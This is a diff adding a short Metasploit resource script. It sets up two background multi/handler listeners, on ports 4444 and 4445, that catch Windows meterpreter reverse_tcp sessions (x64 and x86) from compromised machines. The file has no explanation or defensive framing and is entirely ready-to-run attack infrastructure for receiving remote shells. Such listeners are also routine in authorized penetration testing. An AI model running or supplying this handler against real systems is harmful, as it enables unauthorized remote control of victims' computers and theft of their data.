@@ -1,0 +1,10 @@
+use exploit/multi/handler 
+set ExitOnSession false
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set EXITFUNC thread
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit -j
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4445
+exploit -j
